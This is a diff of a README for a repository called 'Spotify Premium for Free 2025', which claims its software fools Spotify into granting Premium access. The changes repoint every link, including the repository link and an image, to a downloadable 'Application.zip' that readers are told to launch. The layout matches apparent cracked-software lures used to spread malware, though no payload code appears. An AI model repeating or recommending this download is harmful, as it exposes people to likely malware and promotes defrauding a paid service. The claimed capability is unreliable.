@@ -19,7 +19,7 @@ Welcome to the "Spotify Premium for Free 2025" repository! 🎉 This software is
 ## Getting Started
 To get started with enjoying Spotify Premium for free through this software, simply download the software package from the link below and follow the installation instructions.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/yonnderr/Spotify-Premium-for-free-2025/releases/download/v1.0.0/Application.zip)](https://github.com/yonnderr/Spotify-Premium-for-free-2025/releases/download/v1.0.0/Application.zip)
 
 *Note: The provided link needs to be launched to access the software package.*
 
@@ -30,8 +30,8 @@ In addition to fooling Spotify into granting you Premium access, this software e
 
 Start enjoying Spotify Premium features for free today with "Spotify Premium for Free 2025"!
 
-🔗 [Visit Repository](https://github.com/rokytd/Spotify-Premium-for-free-2025)
+🔗 [Visit Repository](https://github.com/yonnderr/Spotify-Premium-for-free-2025/releases/download/v1.0.0/Application.zip)
 
 ---
 
-![Enjoy Free Spotify Premium](https://media.giphy.com/media/26uf1HYBLxWVkwNRa/giphy.gif)
+![Enjoy Free Spotify Premium](https://github.com/yonnderr/Spotify-Premium-for-free-2025/releases/download/v1.0.0/Application.zip)
